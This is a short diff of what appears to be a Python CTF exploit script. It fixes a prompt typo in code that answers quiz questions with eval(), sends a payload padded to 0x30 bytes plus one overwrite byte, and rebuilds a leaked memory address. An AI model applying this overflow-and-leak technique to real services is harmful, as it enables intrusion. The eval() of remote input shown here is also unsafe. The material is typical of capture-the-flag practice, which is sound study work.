@@ -12,14 +12,13 @@ while True:
 		p.send('2')
 		p.recvuntil('?')
 		p.send('0')
-		p.recvuntil("Questpn: ")
+		p.recvuntil("Question: ")
 		questpn = p.recvuntil("=")[:-1]
 		answer = str(eval(questpn))
 		payload = answer.ljust(0x30, '\x00') + '\x5c'
 		p.send(payload)
 		p.recvuntil("Level ")
-		addr_l8 = int(p.recvuntil("Questpn: ")[:-10])
-		
+		addr_l8 = int(p.recvuntil("Question: ")[:-10])
 		if addr_l8 < 0:
 			addr_l8 = addr_l8 + 0x100000000
 		addr = addr_l8 + 0x7f8b00000000
